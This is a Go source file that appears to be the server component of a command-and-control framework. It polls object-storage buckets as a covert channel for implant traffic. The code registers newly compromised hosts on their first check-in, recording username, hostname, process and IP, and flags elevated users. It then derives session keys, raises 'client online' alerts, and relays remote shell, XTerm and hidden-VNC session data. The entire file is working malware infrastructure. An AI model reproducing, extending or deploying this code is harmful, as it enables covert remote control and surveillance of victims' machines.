package oss

import (
	"BackendTemplate/pkg/command"
	"BackendTemplate/pkg/connection"
	"BackendTemplate/pkg/database"
	"BackendTemplate/pkg/encrypt"
	"BackendTemplate/pkg/notification"
	"BackendTemplate/pkg/utils"
	"BackendTemplate/pkg/utils/logx"
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"
)

// XTerm/HVNC 会话广播函数，由 api 包在初始化时注入（nil 时 HandleClientReply 跳过）
var BroadcastToXTermSessions func(uid string, data []byte)
var BroadcastToHVNCSessions func(uid, sid string, frame []byte)

// clientByUID 记录每个 OSS 客户端由哪个监听器的 client 服务（stopKey 即该监听器的
// listen_address）。sendcommand 只有 uid，多监听器下必须靠它取回正确的 client，
// 否则命令会被写进另一个桶（原实现用包级 Service，多监听器时恒为最后初始化的那个）。
type registeredClient struct {
	client  *Client
	stopKey string
}

var (
	clientRegMu sync.RWMutex
	clientByUID = make(map[string]registeredClient)
)

// RegisterClient 登记某客户端归属的 OSS 监听器（客户端每次消息都会刷新）
func RegisterClient(uid, stopKey string, c *Client) {
	if uid == "" || c == nil {
		return
	}
	clientRegMu.Lock()
	clientByUID[uid] = registeredClient{client: c, stopKey: stopKey}
	clientRegMu.Unlock()
}

// ClientForUID 取服务该客户端的 OSS client；未登记（监听器已停止/客户端从未上报）返回 nil
func ClientForUID(uid string) *Client {
	clientRegMu.RLock()
	defer clientRegMu.RUnlock()
	return clientByUID[uid].client
}

// UnregisterListener 监听器停止时清掉它名下的客户端登记，
// 避免 sendcommand 继续往已停监听器的桶里写命令
func UnregisterListener(stopKey string) {
	clientRegMu.Lock()
	for uid, rc := range clientByUID {
		if rc.stopKey == stopKey {
			delete(clientByUID, uid)
		}
	}
	clientRegMu.Unlock()
}

// HandleOSSConnection 轮询指定 OSS 桶。client 由调用方（handleOpenPort）初始化后传入：
// 每个监听器一份，不再共用全局状态。stopKey 即该监听器的 listen_address，
// 用于读取停止通道与登记客户端归属（原实现由四段地址拼回，属脆弱重建）。
// masterKey/salt 为该监听器的会话密钥材料（已归一化为 32/16 字节）：
// 多实例下不能按类型查库（只能取到任意一行）。
func HandleOSSConnection(client *Client, stopKey string, masterKey, salt []byte) {
	// 崩溃防护：OSS 处理循环任何 panic 都不能杀死整个进程
	defer func() {
		if r := recover(); r != nil {
			logx.Errorf("❌ [OSS-RECOVER] 处理循环panic已捕获: %v\n", r)
		}
	}()

	// 锁内读取停止通道并缓存，避免 select 内无锁读 map 与关闭路径 delete 并发（map 竞争 panic）
	connection.MuClientListenerType.Lock()
	stopCh, _ := connection.StopChan[stopKey]
	connection.MuClientListenerType.Unlock()

	// 自适应轮询间隔: 有消息时快速跟进(1s),连续空闲退避到 5s
	// (原固定 1s 每秒全桶 List,API 配额与延迟双耗;空闲时无意义)
	pollInterval := 1 * time.Second
	const idleBackoff = 5 * time.Second
	for {
		if stopCh != nil {
			select {
			case <-stopCh:
				return
			default:
			}
		}
		time.Sleep(pollInterval)
		var keys []string
		for _, c2 := range List(client) {
			if strings.Contains(c2.Key, "client") {
				keys = append(keys, c2.Key)
			}
		}

		// 2. 按时间戳排序
		sort.Slice(keys, func(i, j int) bool {
			return keys[i] < keys[j] // 字符串直接按字典序比较（因为时间戳格式是递增的）
		})

		// 3. 顺序处理
		for _, key := range keys {
			process_server(client, stopKey, key, masterKey, salt) // 不用 `go`，保证按顺序执行
		}

		// 空闲退避: 无消息时间隔翻倍直至上限;有消息立即回到 1s
		if len(keys) == 0 {
			pollInterval *= 2
			if pollInterval > idleBackoff {
				pollInterval = idleBackoff
			}
		} else {
			pollInterval = 1 * time.Second
		}
	}
}
func process_server(c *Client, stopKey, name string, masterKey, salt []byte) {

	message := Get(c, name)
	Del(c, name)
	// 长度校验：至少 4 字节类型头
	if len(message) < 4 {
		logx.Warnf("⚠️ [OSS] 消息长度不足: %d (key=%s)\n", len(message), name)
		return
	}
	const maxOSSMessageSize = 64 * 1024 * 1024 // 64MB
	if len(message) > maxOSSMessageSize {
		logx.Warnf("⚠️ [OSS] 消息超过大小上限: %d (key=%s)\n", len(message), name)
		return
	}
	msgTypeBytes := message[:4]
	msgType := binary.BigEndian.Uint32(msgTypeBytes)
	switch msgType {
	case 1: //firstBlood
		msg := message[4:]
		tmpMetainfo, err := encrypt.DecodeBase64(msg)
		if err != nil {
			logx.Println(err)
			return
		}
		metaMK, metaSalt := masterKey, salt
		// J4: 拒绝公开默认密钥连接
		if encrypt.IsDefaultListenerKey(metaMK, metaSalt) {
			logx.Warnf("⚠️ [OSS-FIRSTBLOOD] 监听器使用公开默认密钥，拒绝连接\n")
			return
		}
		metainfo, err := encrypt.DecryptWithMasterKeyRaw(tmpMetainfo, metaMK)
		if err != nil {
			logx.Println(err)
			return
		}
		// FirstBlood 元数据长度校验
		if len(metainfo) < 10 {
			logx.Warnf("⚠️ [OSS] FirstBlood元数据长度不足: %d\n", len(metainfo))
			return
		}
		uid := encrypt.BytesToMD5(metainfo)
		// 登记归属：sendcommand 只有 uid，靠它取回本监听器的 client
		RegisterClient(uid, stopKey, c)

		// 立即为客户端生成会话密钥（确保与客户端同步）
		if encrypt.GlobalKeyManager != nil {
			_, err = encrypt.GlobalKeyManager.DeriveSessionKeyForListenerWithKeys(uid, salt, masterKey, salt)
			if err != nil {
				logx.Warnf("⚠️ [OSS-FIRSTBLOOD] 为客户端 %s 生成会话密钥失败: %v\n", uid, err)
			} else {
				logx.Infof("🔑 [OSS-FIRSTBLOOD] 为客户端 %s 成功生成会话密钥（oss监听器）\n", uid)
			}
		}

		connection.MuClientListenerType.Lock()
		connection.ClientListenerType[uid] = "oss"
		connection.MuClientListenerType.Unlock()

		var client database.Clients
		exsists, _ := database.Engine.Where("uid = ?", uid).Get(&client)
		if !exsists { // FirstBlood
			processID := binary.BigEndian.Uint32(metainfo[:4])
			flag := int(metainfo[4:5][0])
			ipInt := binary.LittleEndian.Uint32(metainfo[5:9])
			localIP := utils.Uint32ToIP(ipInt).String()
			osInfo := string(metainfo[9:])

			osArray := strings.Split(osInfo, "\t")
			if len(osArray) < 3 {
				logx.Warnf("⚠️ [OSS] FirstBlood系统信息字段不足: %d\n", len(osArray))
				return
			}
			hostName := osArray[0]
			UserName := osArray[1]
			processName := osArray[2]
			clientOs := ""
			if len(osArray) >= 4 {
				clientOs = osArray[3]
			}

			externalIp := "oss上线"

			address := "oss上线"

			currentTime := time.Now()
			timeFormat := "2006-01-02 15:04:05"
			formattedTime := currentTime.Format(timeFormat)

			arch := "x86"

			if flag > 8 {
				UserName += "*"
				flag = flag - 8
			}
			if flag > 4 {
				arch = "x64"
			}

			database.Engine.Insert(&database.Clients{Uid: uid, FirstStart: formattedTime, ExternalIP: externalIp, InternalIP: localIP, Username: UserName, Computer: hostName, Process: processName, Pid: strconv.Itoa(int(processID)), Address: address, Arch: arch, Note: "", Sleep: strconv.Itoa(connection.ResolveSleepSeconds(osArray, "")), Online: "1", Color: "", Listener: "oss", Os: clientOs})
			database.Engine.Insert(&database.Shell{Uid: uid, ShellContent: ""})
			database.Engine.Insert(&database.Notes{Uid: uid, Note: ""})

			// 触发客户端上线通知
			if notificationManager := notification.GetNotificationManager(); notificationManager != nil {
				notificationManager.OnClientOnline(uid)
			}
			// B11: 发布客户端上线事件(含完整元数据)
			if command.GlobalEventBus != nil {
				command.PublishEvent(command.EventClientOnline, uid, map[string]interface{}{
					"listener":    "oss",
					"username":    UserName,
					"computer":    hostName,
					"external_ip": externalIp,
					"internal_ip": localIP,
					"pid":         strconv.Itoa(int(processID)),
					"arch":        arch,
					"os":          clientOs,
					"process":     processName,
				})
			}

		}

		// 【会话密钥唯一化】firstBlood 派生成功后立即重派生并下发 nonce（用初始密钥加密写对象）
		// 客户端下次轮询 Get 命令对象时收到，重派生后与服务端 CurrentKey 对齐
		if encrypt.GlobalKeyManager != nil {
			nonce := make([]byte, 16)
			if _, err := rand.Read(nonce); err == nil {
				initialKey, err := encrypt.GlobalKeyManager.RotateSessionKeyWithNonce(uid, salt, masterKey, salt, nonce)
				if err != nil {
					logx.Warnf("⚠️ [OSS-FIRSTBLOOD] 客户端 %s 会话密钥唯一化失败: %v\n", uid, err)
				} else if b64Payload := command.BuildSessionNonceMsgWithKey(initialKey, nonce); b64Payload != nil {
					Send(c, uid+fmt.Sprintf("/server_%020d", time.Now().UnixNano()), b64Payload)
					logx.Infof("🔑 [OSS-FIRSTBLOOD] 客户端 %s 会话密钥唯一化完成，nonce 已写入命令对象\n", uid)
				}
			}
		}

		// 更新客户端在线状态
		database.SetClientOnline(uid, "oss")

		// 注册到统一离线检测器（统一心跳：优先采用客户端上报的 beacon sleep，回退监听器配置）
		if connection.GlobalOfflineDetector != nil {
			_, hbInterval := database.GetListenerHeartbeatConfigByAddr(stopKey, "oss")
			ossMeta := strings.Split(string(metainfo[9:]), "\t")
			sleepSec := connection.ResolveSleepSeconds(ossMeta, hbInterval)
			connection.GlobalOfflineDetector.Register(uid, "oss", sleepSec)
			// OSS 为轮询型，无长连接需关闭，仅依赖心跳 Touch 判定
		}

	case 2: // otherMsg
		//logx.Println("received data")
		msg := message[4:]
		if len(msg) < 8 {
			logx.Warnf("⚠️ [OSS] 消息体长度不足: %d\n", len(msg))
			return
		}
		metaLen := binary.BigEndian.Uint32(msg[:4])
		if 4+int(metaLen) > len(msg) {
			logx.Warnf("⚠️ [OSS] 元数据长度越界: metaLen=%d, len=%d\n", metaLen, len(msg))
			return
		}
		metaMsg := msg[4 : 4+metaLen]
		realMsg := msg[4+metaLen:]

		tmpMetainfo, err := encrypt.DecodeBase64(metaMsg)
		if err != nil {
			logx.Println(err)
		}
		metaMK := masterKey
		metainfo, err := encrypt.DecryptWithMasterKeyRaw(tmpMetainfo, metaMK)
		if err != nil {
			logx.Println(err)
		}
		uid := encrypt.BytesToMD5(metainfo)
		RegisterClient(uid, stopKey, c)

		// 统一离线检测器 Touch
		if connection.GlobalOfflineDetector != nil {
			connection.GlobalOfflineDetector.Touch(uid)
		}

		dataBytes, err := encrypt.DecodeBase64(realMsg)
		if err != nil {
			logx.Warnf("⚠️ [OSS] 消息解码失败: %v\n", err)
			return
		}
		dataBytes, err = encrypt.DecryptWithSessionKey(dataBytes, uid)
		if err != nil {
			// 【加密体系改造】不再回落旧加密
			logx.Warnf("⚠️ [OSS] 会话密钥解密失败: %v\n", err)
			return
		}
		// 客户端回包统一处理（四协议共用 pkg/command/reply_handlers.go，B4 收敛）：
		// 随之补齐 OSS 原缺失的 XTerm/31 错误回包/HVNC 实时广播、下载进度节流落库
		// （原每分块直写 UPDATE）、shell 增量追加（原为读整 blob→追加→写回的 IO 放大路径）
		replyType, data, err := command.SplitReplyPayload(dataBytes)
		if err != nil {
			logx.Warnf("⚠️ [OSS] %v, UID: %s\n", err, uid)
			return
		}
		logx.Infof("📨 [OSS] 处理回包 - UID: %s, 消息类型: %d, 数据长度: %d\n", uid, replyType, len(data))
		if err := command.HandleClientReply("oss", uid, replyType, data, BroadcastToXTermSessions, BroadcastToHVNCSessions); err != nil {
			logx.Warnf("⚠️ [OSS] 处理回包失败 (type=%d): %v\n", replyType, err)
		}
	}
	return
}
